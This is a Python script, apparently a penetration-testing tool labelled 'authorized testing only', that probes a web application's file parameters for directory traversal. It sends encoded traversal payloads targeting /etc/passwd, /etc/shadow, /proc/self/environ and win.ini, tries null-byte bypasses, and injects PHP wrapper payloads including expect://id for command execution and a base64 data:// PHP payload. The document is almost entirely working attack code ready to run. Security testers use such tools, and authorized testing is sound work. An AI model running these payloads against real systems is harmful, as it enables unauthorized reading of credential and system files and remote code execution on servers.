#!/usr/bin/env python3
"""
Directory Traversal Testing Agent — AUTHORIZED TESTING ONLY
Tests web applications for path traversal (LFI) vulnerabilities by
injecting traversal sequences into file path parameters.

WARNING: Only use with explicit written authorization for the target application.
"""

import json
import sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests


TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd",
    "\\..\\..\\..\\..\\windows\\win.ini",
    "....\\....\\....\\etc\\passwd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/proc/self/environ",
    "/etc/shadow",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..././..././..././etc/passwd",
    "..;/..;/..;/etc/passwd",
]

LINUX_INDICATORS = ["root:x:", "root:*:", "daemon:", "bin:x:", "nobody:"]
WINDOWS_INDICATORS = ["[fonts]", "[extensions]", "[mci extensions]", "for 16-bit"]


def identify_file_parameters(url: str) -> list[str]:
    """Identify URL parameters that likely handle file paths."""
    file_param_names = [
        "file", "path", "page", "include", "template", "doc",
        "document", "folder", "root", "dir", "filename",
        "download", "read", "load", "view", "content",
        "img", "image", "src", "resource", "cat",
    ]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return [p for p in params if p.lower() in file_param_names]


def test_traversal(url: str, param: str, session: requests.Session = None) -> list[dict]:
    """Test a parameter for directory traversal vulnerability."""
    if session is None:
        session = requests.Session()

    results = []
    parsed = urlparse(url)
    original_params = parse_qs(parsed.query)

    for payload in TRAVERSAL_PAYLOADS:
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
        test_params[param] = payload

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params), parsed.fragment,
        ))

        try:
            resp = session.get(test_url, timeout=10, allow_redirects=False)
            body = resp.text

            is_vulnerable = False
            evidence = ""

            for indicator in LINUX_INDICATORS:
                if indicator in body:
                    is_vulnerable = True
                    evidence = f"Linux file content detected: '{indicator}'"
                    break

            if not is_vulnerable:
                for indicator in WINDOWS_INDICATORS:
                    if indicator.lower() in body.lower():
                        is_vulnerable = True
                        evidence = f"Windows file content detected: '{indicator}'"
                        break

            if is_vulnerable:
                results.append({
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "status_code": resp.status_code,
                    "vulnerable": True,
                    "evidence": evidence,
                    "response_length": len(body),
                    "severity": "HIGH",
                })

        except requests.RequestException:
            continue

    return results


def test_null_byte_bypass(url: str, param: str, session: requests.Session = None) -> list[dict]:
    """Test null byte injection to bypass file extension checks."""
    if session is None:
        session = requests.Session()

    null_payloads = [
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.html",
        "../../../etc/passwd\x00",
    ]

    results = []
    parsed = urlparse(url)
    original_params = parse_qs(parsed.query)

    for payload in null_payloads:
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
        test_params[param] = payload

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params), parsed.fragment,
        ))

        try:
            resp = session.get(test_url, timeout=10)
            if any(ind in resp.text for ind in LINUX_INDICATORS):
                results.append({
                    "url": test_url,
                    "payload": payload,
                    "bypass_type": "null_byte",
                    "vulnerable": True,
                    "severity": "CRITICAL",
                })
        except requests.RequestException:
            continue

    return results


def test_wrapper_protocols(url: str, param: str, session: requests.Session = None) -> list[dict]:
    """Test PHP wrapper protocols for LFI exploitation."""
    if session is None:
        session = requests.Session()

    wrappers = [
        ("php://filter/convert.base64-encode/resource=index", "PHP filter wrapper"),
        ("php://input", "PHP input wrapper"),
        ("expect://id", "PHP expect wrapper"),
        ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "PHP data wrapper"),
        ("file:///etc/passwd", "file:// wrapper"),
    ]

    results = []
    parsed = urlparse(url)
    original_params = parse_qs(parsed.query)

    for wrapper, description in wrappers:
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
        test_params[param] = wrapper

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params), parsed.fragment,
        ))

        try:
            resp = session.get(test_url, timeout=10)
            suspicious = (
                resp.status_code == 200 and
                len(resp.text) > 100 and
                "404" not in resp.text.lower()[:200]
            )
            if suspicious:
                results.append({
                    "url": test_url,
                    "wrapper": wrapper,
                    "description": description,
                    "status_code": resp.status_code,
                    "response_length": len(resp.text),
                    "severity": "CRITICAL",
                })
        except requests.RequestException:
            continue

    return results


def generate_report(traversal: list, null_byte: list, wrappers: list) -> str:
    """Generate directory traversal testing report."""
    all_vulns = traversal + null_byte + wrappers
    lines = [
        "DIRECTORY TRAVERSAL TESTING REPORT — AUTHORIZED TESTING ONLY",
        "=" * 65,
        f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        f"Total Vulnerabilities Found: {len(all_vulns)}",
        "",
        f"TRAVERSAL FINDINGS ({len(traversal)}):",
        "-" * 40,
    ]

    for v in traversal:
        lines.append(f"  [{v['severity']}] {v['parameter']}: {v['payload']}")
        lines.append(f"    Evidence: {v['evidence']}")

    if null_byte:
        lines.extend([f"\nNULL BYTE BYPASS ({len(null_byte)}):"])
        for n in null_byte:
            lines.append(f"  [{n['severity']}] {n['payload']}")

    if wrappers:
        lines.extend([f"\nWRAPPER PROTOCOL ({len(wrappers)}):"])
        for w in wrappers:
            lines.append(f"  [{w['severity']}] {w['wrapper']} - {w['description']}")

    return "\n".join(lines)


if __name__ == "__main__":
    print("[!] DIRECTORY TRAVERSAL TESTING — AUTHORIZED TESTING ONLY\n")

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url_with_params> [param_name]")
        print(f"  Example: {sys.argv[0]} 'http://target/view?file=report.pdf' file")
        sys.exit(1)

    target_url = sys.argv[1]
    param_name = sys.argv[2] if len(sys.argv) > 2 else None

    if not param_name:
        file_params = identify_file_parameters(target_url)
        if file_params:
            param_name = file_params[0]
            print(f"[*] Auto-detected file parameter: {param_name}")
        else:
            print("[!] No file parameter detected. Specify parameter name.")
            sys.exit(1)

    session = requests.Session()

    print(f"[*] Testing parameter '{param_name}' for directory traversal...")
    traversal_results = test_traversal(target_url, param_name, session)

    print("[*] Testing null byte bypass...")
    null_results = test_null_byte_bypass(target_url, param_name, session)

    print("[*] Testing wrapper protocols...")
    wrapper_results = test_wrapper_protocols(target_url, param_name, session)

    report = generate_report(traversal_results, null_results, wrapper_results)
    print(report)
